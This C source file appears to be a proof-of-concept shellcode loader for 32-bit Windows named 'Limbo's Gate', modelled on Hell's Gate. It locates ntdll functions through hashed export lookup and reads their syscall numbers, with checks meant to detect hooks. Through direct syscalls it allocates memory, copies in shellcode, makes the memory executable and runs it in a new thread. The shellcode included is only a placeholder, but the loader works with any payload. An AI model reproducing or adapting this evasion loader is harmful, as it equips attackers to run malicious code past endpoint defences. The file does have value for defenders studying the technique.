#include <stdint.h>
#include <stdlib.h>
#include <windows.h>
#include "headers.h"

extern void __fastcall limbo_hell(uintptr_t callback);
extern void __fastcall limbos_gate(uint32_t syscall);
extern limbo_descent();

typedef struct __IATEntry
{
   uint32_t hash;
   union
   {
      uintptr_t address;
      uint32_t syscall;
   } target;
} IATEntry;

typedef struct __LimboIAT
{
   IATEntry NtAllocateVirtualMemory;
   IATEntry NtProtectVirtualMemory;
   IATEntry NtCreateThreadEx;
   IATEntry NtWaitForSingleObject;
} LimboIAT;

uint32_t fnv321a(const char *string)
{
   uint32_t hashval = 0x811c9dc5;

   while (*string != 0)
   {
      hashval ^= *string++;
      hashval *= 0x1000193;
   }

   return hashval;
}

BOOL get_proc_by_hash(const PIMAGE_DOS_HEADER module, IATEntry *entry)
{
   const uint8_t *byte_module = ((const uint8_t *)module);
   const IMAGE_NT_HEADERS *nt_headers = ((const IMAGE_NT_HEADERS *)(byte_module+module->e_lfanew));
   const IMAGE_EXPORT_DIRECTORY *export_directory = ((const IMAGE_EXPORT_DIRECTORY *)(
                                                        byte_module+nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
   const DWORD *name_pointers = ((const DWORD *)(byte_module+export_directory->AddressOfNames));
   const WORD *name_ordinals = ((const WORD *)(byte_module+export_directory->AddressOfNameOrdinals));
   const DWORD *functions = ((const DWORD *)(byte_module+export_directory->AddressOfFunctions));

   for (uint32_t i=0; i<export_directory->NumberOfNames; ++i)
   {
      const char *name = ((const char *)(&byte_module[name_pointers[i]]));

      if (fnv321a(name) != entry->hash)
         continue;

      // we only really need this if we're importing functions that aren't syscalls.
      // for our purposes, we don't need ntdll.dll addresses, which is why they get
      // turned into syscalls
      entry->target.address = ((uintptr_t)(byte_module+functions[name_ordinals[i]]));

      // the rest of this code is lifted from Hell's Gate's PoC code
      uint8_t *addr_ptr = (uint8_t *)(entry->target.address);
      uint16_t scan = 0;

      while (TRUE)
      {
         // if we landed on ret, we missed our syscall prep, probably because we're hooked!
         if (addr_ptr[scan] == 0xc2 || addr_ptr[scan] == 0xc3)
            return FALSE;

         // opcodes should be the following:
         // * mov eax, <syscall>
         // * mov edx, <64-bit bridge func>
         // * call edx
         // it typically is just a uint16_t in a uint32_t though
         if (addr_ptr[scan] == 0xb8 && addr_ptr[scan+5] == 0xba)
         {
            entry->target.address = 0;
            entry->target.syscall = *((uint32_t *)(&addr_ptr[scan+1]));
            limbo_hell(*((uintptr_t *)(&addr_ptr[scan+6])));
            break;
         }

         ++scan;
      }

      return TRUE;
   }

   return FALSE;
}

BOOL load_iat(LimboIAT *iat)
{
   PPEB peb = ((PPEB)__readfsdword(0x30));
   PLDR_DATA_TABLE_ENTRY list_entry = (PLDR_DATA_TABLE_ENTRY)peb->LoaderData->InLoadOrderModuleList.Flink;
   PLDR_DATA_TABLE_ENTRY ntdll = (PLDR_DATA_TABLE_ENTRY)list_entry->InLoadOrderLinks.Flink;

   iat->NtAllocateVirtualMemory.hash = 0xca67b978;
   if (!get_proc_by_hash((PIMAGE_DOS_HEADER)ntdll->DllBase, &iat->NtAllocateVirtualMemory))
      return FALSE;

   iat->NtProtectVirtualMemory.hash = 0xbd799926;
   if (!get_proc_by_hash((PIMAGE_DOS_HEADER)ntdll->DllBase, &iat->NtProtectVirtualMemory))
      return FALSE;

   iat->NtCreateThreadEx.hash = 0xed0594da;
   if (!get_proc_by_hash((PIMAGE_DOS_HEADER)ntdll->DllBase, &iat->NtCreateThreadEx))
      return FALSE;

   iat->NtWaitForSingleObject.hash = 0xb073c52e;
   if (!get_proc_by_hash((PIMAGE_DOS_HEADER)ntdll->DllBase, &iat->NtWaitForSingleObject))
      return FALSE;

   return TRUE;
}

int main(int argc, char *argv[])
{
   LimboIAT iat;

   if (!load_iat(&iat))
      return 1;

   NTSTATUS status;
   const char shellcode[] = "\x90\x90\x90\x90\xcc\xcc\xcc\xcc\xc3";
   uint8_t *allocation = NULL;
   size_t allocation_size = sizeof(shellcode);
   limbos_gate(iat.NtAllocateVirtualMemory.target.syscall);
   status = (NTSTATUS)(limbo_descent((HANDLE)-1, &allocation, 0, &allocation_size, MEM_COMMIT, PAGE_READWRITE));

   if (status != 0)
      return 1;

   // this is a macro that inlines memcpy basically
   CopyMemory(allocation, shellcode, sizeof(shellcode));

   uint32_t old_protect;
   limbos_gate(iat.NtProtectVirtualMemory.target.syscall);
   status = (NTSTATUS)(limbo_descent((HANDLE)-1, &allocation, &allocation_size, PAGE_EXECUTE_READ, &old_protect));

   if (status != 0)
      return 1;

   HANDLE shellcode_thread;
   limbos_gate(iat.NtCreateThreadEx.target.syscall);
   status = (NTSTATUS)(limbo_descent(&shellcode_thread,
                                     THREAD_ALL_ACCESS,
                                     NULL,
                                     (HANDLE)-1,
                                     (LPTHREAD_START_ROUTINE)(allocation),
                                     NULL,
                                     FALSE,
                                     NULL,
                                     NULL,
                                     NULL,
                                     NULL));

   if (status != 0)
      return 1;

   LARGE_INTEGER timeout;
   timeout.QuadPart = -10000;
   limbos_gate(iat.NtWaitForSingleObject.target.syscall);
   status = (NTSTATUS)(limbo_descent(shellcode_thread, FALSE, &timeout));

   return status != 0x102;
}
